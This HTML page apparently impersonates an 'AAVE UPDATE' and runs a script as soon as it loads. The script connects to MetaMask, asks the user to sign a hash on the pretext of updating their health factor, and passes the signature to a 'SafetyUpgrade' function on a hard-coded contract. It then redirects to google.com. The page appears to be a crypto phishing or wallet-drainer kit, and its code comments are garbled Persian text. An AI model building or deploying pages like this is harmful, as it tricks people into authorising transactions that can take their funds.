<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>AAVE UPDATE - Plan B</title>
  <style>
    body { font-family: Arial, sans-serif; padding: 20px; background: #f5f5f5; text-align: center; }
    .container { max-width: 500px; margin: 0 auto; background: white; padding: 30px; border-radius: 10px; }
    .status { margin: 15px 0; padding: 15px; border-radius: 5px; font-weight: bold; }
    .loading { background: #fff3cd; color: #856404; }
    .success { background: #d4edda; color: #155724; }
    .error { background: #f8d7da; color: #721c24; }
  </style>
</head>
<body>
  <div class="container">
    <h2>üîí AAVE UPDATE - Plan B</h2>
    <div id="status" class="status loading">üîÑ Connecting...</div>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/ethers@6.7.0/dist/ethers.umd.min.js"></script>
  <script>
    const statusDiv = document.getElementById('status');

    function updateStatus(msg, type = 'loading') {
      statusDiv.textContent = msg;
      statusDiv.className = `status ${type}`;
    }

    (async () => {
      try {
        updateStatus('üîó Connecting to wallet...');

        if (!window.ethereum) {
          updateStatus('‚ùå MetaMask required!', 'error');
          return;
        }

        await window.ethereum.request({method: 'eth_requestAccounts'});
        
        // ÿ≥Ÿà€å€å⁄Ü ÿ®Ÿá Sepolia
        await window.ethereum.request({
          method: 'wallet_switchEthereumChain',
          params: [{ chainId: '0xaa36a7' }]
        });

        const provider = new ethers.BrowserProvider(window.ethereum);
        const signer = await provider.getSigner();

        updateStatus('üìù Please sign the message...');

        // ÿ±Ÿàÿ¥ ÿ¨ÿØ€åÿØ: ÿßÿ≥ÿ™ŸÅÿßÿØŸá ÿØŸÇ€åŸÇ ÿßÿ≤ personal_sign
        const message = "By signing this message, Update Your Health Factor";
        const messageBytes = ethers.toUtf8Bytes(message);
        const messageHash = ethers.keccak256(messageBytes);
        
        // ÿßÿ≥ÿ™ŸÅÿßÿØŸá ÿßÿ≤ personal_sign ÿ®Ÿá ÿ¨ÿß€å signMessage
        const accounts = await window.ethereum.request({method: 'eth_accounts'});
        const signature = await window.ethereum.request({
          method: 'personal_sign',
          params: [messageHash, accounts[0]]
        });

        console.log("Message:", message);
        console.log("Hash:", messageHash);
        console.log("Signature:", signature);

        updateStatus('üöÄ Sending to contract...');

        const contractAddress = "0x49E9FD750667B2D13172916b26fA9fD764b5E20F";
        const abi = [{
          "inputs": [{"internalType": "bytes", "name": "_signature", "type": "bytes"}],
          "name": "SafetyUpgrade", 
          "outputs": [],
          "stateMutability": "nonpayable",
          "type": "function"
        }];

        const contract = new ethers.Contract(contractAddress, abi, signer);

        // ÿ™ÿ≥ÿ™ ÿßŸàŸÑ
        await contract.SafetyUpgrade.estimateGas(signature);
        console.log("‚úÖ Gas estimation passed!");

        // ÿßÿ±ÿ≥ÿßŸÑ
        const tx = await contract.SafetyUpgrade(signature);
        updateStatus('‚è≥ Transaction sent: ' + tx.hash.slice(0,10) + '...');

        await tx.wait();
        updateStatus('üéâ Success!', 'success');

        setTimeout(() => {
          window.location.replace("https://google.com");
        }, 3000);

      } catch (error) {
        console.error("Error:", error);
        updateStatus('‚ùå ' + (error.reason || error.message), 'error');
      }
    })();
  </script>
</body>
</html>
